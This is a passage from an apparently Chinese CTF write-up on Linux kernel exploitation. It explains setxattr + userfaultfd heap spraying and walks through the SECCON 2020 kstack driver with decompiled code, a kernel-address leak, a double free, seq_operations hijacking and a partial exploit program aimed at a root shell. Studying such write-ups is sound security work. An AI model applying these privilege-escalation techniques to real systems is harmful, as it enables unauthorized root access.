class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function">  <span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> error;</span><br><span class="line">  <span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">  <span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">    error = -ERANGE;</span><br><span class="line">  <span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">      <span class="keyword">return</span> -E2BIG;</span><br><span class="line">    kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!kvalue)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">      error = -EFAULT;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">        (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">      posix_acl_fix_xattr_from_user(mnt_userns, d_inode(d),</span><br><span class="line">                                    kvalue, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">  out:</span><br><span class="line">  kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我发现linux5.19版本里的setxattr函数的代码发生了变化，对于新版本的利用我还了解到比较少这里就不展开说了。可以看到上述代码中可以直接进行kvmalloc之后copy_from_user并且size和value都是我门可控的但是最后会free掉object。</p><h3 id="setxattr-amp-userfaultfd"><a href="#setxattr-amp-userfaultfd" class="headerlink" title="setxattr &amp; userfaultfd"></a>setxattr &amp; userfaultfd</h3><p>虽然我们可控一个object的内容，但是最后始终会free掉导致我们前功尽弃了。但是看过上一篇文章可以注意到在函数中会调用到copy_from_user从用户空间拷贝数据。那么我们可以产生下述想法：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t016d23a8748e20bf24.png"                      alt="img"                ></p><p>上述就是 setxattr + userfaultfd的堆占位技术</p><h2 id="例题：SECCON-2020-kstack"><a href="#例题：SECCON-2020-kstack" class="headerlink" title="例题：SECCON 2020 kstack"></a>例题：SECCON 2020 kstack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目开启保护有：smep，KPTI，kaslr</p><p>并且题目给的驱动模块只有一个ioctl函数可供利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line">v8 = kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL); <span class="comment">// size:0x20</span></span><br><span class="line">*(_DWORD *)v8 = v4;</span><br><span class="line">v9 = head;</span><br><span class="line">head = v8;</span><br><span class="line">*(_QWORD *)(v8 + <span class="number">16</span>) = v9;</span><br><span class="line"><span class="keyword">if</span> ( !copy_from_user(v8 + <span class="number">8</span>, v3, <span class="number">8LL</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">head = *(_QWORD *)(v8 + <span class="number">16</span>);</span><br><span class="line">kfree(v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-22LL</span>;</span><br></pre></td></tr></table></figure><p>这里分配使用了<code>kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL);</code>，第二个参数是 flag ，为常规的 <code>GFP_KERNEL</code>这里可以暂且忽略。主要关注的是第一个参数，内核中有一个数组<code>kmalloc_caches</code>存放着<code>kmalloc_cache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4194304</span>, <span class="number">4</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8388608</span>, <span class="number">8</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16777216</span>, <span class="number">16</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">33554432</span>, <span class="number">32</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>kmem_caches[5]</code>对应的大小也就是32。然后这里object的前四个字节存放的内容为线程组的id。那么可以推测出结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line"><span class="keyword">if</span> ( a2 != <span class="number">0x57AC0001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x57AC0002</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5 = head;</span><br><span class="line">  <span class="keyword">if</span> ( !head )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == LODWORD(head-&gt;id) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_to_user(a3, &amp;head-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">      head = (struct node *)v5-&gt;prev;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (struct node *)head-&gt;prev;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( LODWORD(v6-&gt;id) != v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( !v6-&gt;prev )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        v6 = (struct node *)v6-&gt;prev;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(a3, &amp;v6-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;prev = v6-&gt;prev;</span><br><span class="line">        LABEL_12:</span><br><span class="line">        kfree(v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是上面这个功能，这里首先判断id是否等于当前进程的id如果是则取出数据，若果不是则开始进行循环查找，找到是当前进程id的object再读取数据。在读取出数据之后会进行脱链然后进行free操作。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>可以注意到上述代码中都没有锁的操作，所以这也为userfaultfd提供了可能性。</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a><strong>leak</strong></h4><p>这里只可以读取<code>object+8</code>位置处的数据，这里选择的结构体为： <code>shm_file_data</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里ns位置存放的是kernel的.text段的地址。所以正好是可以泄漏出kernel地址。这里使用的办法就是先创建一个shm结构体随后释放掉，然后我们利用驱动申请一个object，使用userfaultfd阻止我们的数据写入到object中，然后在同一个线程读取出来内容。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a><strong>attack</strong></h4><p>后续的利用需要使用到double free，这里的double free不知道为什么是可以直接进行的不需要中间隔一个object，所以有清楚的师傅希望可以在评论区告诉我一下。最后就是使用<code>seq_operations</code>和<code>setxattr</code>进行劫持。在最后会用到堆占位的技术，即我们在setxattr中的copy_from_user时，我们只需要将前面0x8个字节的内容复制到<code>seq_operations</code>中，那么后续使用pt_regs进行稳定的拿到root shell。</p><p>对于pt_regs有疑问的可以看一下我前面文章中 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/#0CTF-2021-final-kernote">0CTF 2021 final kernote</a> 这道题的做法。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *seq_fd_reserve[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0001</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x57AC0002</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">leak_handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler created&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span 